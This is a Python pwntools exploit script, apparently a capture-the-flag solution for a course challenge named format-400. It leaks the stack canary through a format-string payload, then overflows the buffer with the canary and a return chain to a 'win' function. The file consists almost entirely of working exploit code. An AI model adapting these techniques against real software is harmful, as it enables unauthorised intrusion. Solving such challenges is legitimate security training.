#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack disasm regs
        b *0x40128f
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4830-format-400.chals.io", 443, ssl=True, sni="cse4830-format-400.chals.io")
    else:
        return process(binary)

def exploit(p,e,r):
    p.sendline(b'%23$p')
    p.recvuntil("<<< Hello, 0x")
    canary = p64(int(p.recvline().strip(),16))
    print(canary)

    win = p64(e.sym['win'])
    fini = p64(e.sym['_fini'])

    chain = b'A' * 136
    chain += canary
    chain += b'B' * 8
    chain += fini + win

    p.sendline(chain)
    p.interactive()

if __name__=="__main__":
    file = './format-400'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
